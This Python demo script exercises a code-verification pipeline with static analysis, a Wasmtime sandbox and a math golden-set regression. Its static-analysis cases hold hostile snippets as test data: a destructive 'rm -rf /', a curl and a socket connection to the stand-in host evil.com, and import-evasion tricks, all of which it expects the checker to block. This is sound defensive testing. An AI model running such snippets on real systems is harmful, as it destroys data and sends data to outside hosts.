#!/usr/bin/env python3
"""Demo 2 — Code verification with static analysis + sandbox fallback.

Shows the code verification pipeline WITHOUT needing Docker or a live model:
  1. Static analysis fallback: AST parse + restricted-import check
  2. Wasmtime sandbox fallback: fuel-limited execution (if wasmtime installed)
  3. The verifier golden-set regression suite: real verified/hallucinated pairs

This demonstrates how the orchestrator verifies code candidates safely:
  - Safe code gets a partial score (0.2 via static, 0.65 via sandbox)
  - Dangerous code (os/subprocess/socket imports) gets score 0.0
  - Dynamic import evasion (__import__, importlib) is caught
  - Infinite loops are caught by Wasmtime fuel limits

    python demo_code_verification.py
"""

import asyncio
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from hybrid_orchestrator import _static_analysis_fallback, _wasmtime_sandbox_fallback


def header(title):
    print(f"\n{'='*70}\n  {title}\n{'='*70}")


def test_static_analysis():
    """Test the static analysis fallback on safe + dangerous code."""
    header("1. STATIC ANALYSIS FALLBACK (AST parse + restricted imports)")

    cases = [
        ("Safe: pure function",
         "def add(a, b):\n    return a + b\n",
         True),

        ("Safe: math computation",
         "import math\n\ndef circle_area(r):\n    return math.pi * r ** 2\n",
         True),

        ("Dangerous: os import",
         "import os\nos.system('rm -rf /')\n",
         False),

        ("Dangerous: subprocess",
         "import subprocess\nsubprocess.run(['curl', 'evil.com'])\n",
         False),

        ("Dangerous: socket exfiltration",
         "import socket\ns = socket.socket()\ns.connect(('evil.com', 4444))\n",
         False),

        ("Dangerous: __import__ evasion",
         "m = __import__('os')\nm.system('whoami')\n",
         False),

        ("Dangerous: importlib evasion",
         "import importlib\nos = importlib.import_module('os')\n",
         False),

        ("Dangerous: builtins reflection",
         "eval = getattr(__builtins__, 'eval')\neval('__import__(\"os\")')\n",
         False),

        ("Syntax error",
         "def broken(:\n    pass\n",
         False),
    ]

    passed = 0
    failed = 0
    for label, code, should_pass in cases:
        score, issues = _static_analysis_fallback(code)
        actually_safe = score > 0.0
        status = "PASS" if actually_safe == should_pass else "FAIL"
        if status == "PASS":
            passed += 1
        else:
            failed += 1
        icon = "OK" if actually_safe else "BLOCKED"
        print(f"  [{status:4}] {icon:8} score={score:.1f}  {label}")
        if issues:
            for issue in issues:
                print(f"           -> {issue}")

    print(f"\n  Results: {passed} passed, {failed} failed")
    return failed == 0


async def test_wasmtime_sandbox():
    """Test the Wasmtime sandbox fallback (if available)."""
    header("2. WASMTIME SANDBOX FALLBACK (fuel-limited execution)")

    wasm_module = os.environ.get("VIBE_WASM_PYTHON_MODULE", "")
    if not wasm_module:
        print("  VIBE_WASM_PYTHON_MODULE not set — Wasmtime sandbox unavailable.")
        print("  (This is normal in dev — the Docker sandbox is the production path.)")
        print()
        print("  The sandbox fallback chain is:")
        print("    1. Wasmtime (if VIBE_WASM_PYTHON_MODULE is set)")
        print("    2. Docker sandbox (if Docker is running)")
        print("    3. Static analysis (if --allow-static-fallback is set)")
        print("    4. Fail-closed: verified=False, score=0.0")
        return True

    # If we have a Wasm module, test it
    cases = [
        ("Safe: simple return", "def f():\n    return 42\n", True),
        ("Infinite loop", "while True:\n    pass\n", False),
    ]

    passed = 0
    failed = 0
    for label, code, should_pass in cases:
        score, issues = await _wasmtime_sandbox_fallback(code)
        actually_safe = score is not None and score > 0.0
        status = "PASS" if actually_safe == should_pass else "FAIL"
        if status == "PASS":
            passed += 1
        else:
            failed += 1
        print(f"  [{status:4}] score={score}  {label}")
        if issues:
            for issue in issues:
                print(f"           -> {issue}")

    print(f"\n  Results: {passed} passed, {failed} failed")
    return failed == 0


async def test_verifier_golden_set():
    """Run a subset of the verifier golden-set regression suite."""
    header("3. VERIFIER GOLDEN-SET REGRESSION (real verified/hallucinated pairs)")

    # Import the golden set test data
    tests_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tests")
    sys.path.insert(0, tests_dir)
    try:
        from test_verifier_golden_set import _MATH_GOLDEN
    except ImportError:
        print("  Could not import golden set — skipping.")
        return True

    from verifiers.math_verifier import MathVerifier

    passed = 0
    failed = 0
    verifier = MathVerifier()

    for query, answer, context, expected, comment in _MATH_GOLDEN:
        result = await verifier.verify(query, answer, context=context)
        actually_verified = result.verified

        status = "PASS" if actually_verified == expected else "FAIL"
        if status == "PASS":
            passed += 1
        else:
            failed += 1

        label = "verified" if expected else "rejected"
        got = "verified" if actually_verified else "rejected"
        print(f"  [{status:4}] expected={label:9} got={got:9}  q={query[:30]:30}  a={answer[:20]:20}  ({comment[:40]})")

    print(f"\n  Results: {passed}/{passed + failed} correct")
    return failed == 0


async def main():
    header("DEMO 2: Code Verification Pipeline")
    print("  Shows how the orchestrator safely verifies code candidates.")
    print("  No Docker or model server required.")
    print()

    ok1 = test_static_analysis()
    ok2 = await test_wasmtime_sandbox()
    ok3 = await test_verifier_golden_set()

    header("SUMMARY")
    print(f"  Static analysis:     {'PASS' if ok1 else 'FAIL'}")
    print(f"  Wasmtime sandbox:    {'PASS' if ok2 else 'FAIL'}")
    print(f"  Verifier golden set: {'PASS' if ok3 else 'FAIL'}")
    print()
    print("  The verification pipeline layers defense-in-depth:")
    print("    1. AST static analysis catches obvious dangers (imports, syntax)")
    print("    2. Wasmtime sandbox catches obfuscated dangers (fuel-limited)")
    print("    3. Docker sandbox provides full isolation in production")
    print("    4. Mutation testing catches vacuous test suites")
    print("    5. The golden-set regression suite guards against verifier regressions")


if __name__ == "__main__":
    asyncio.run(main())
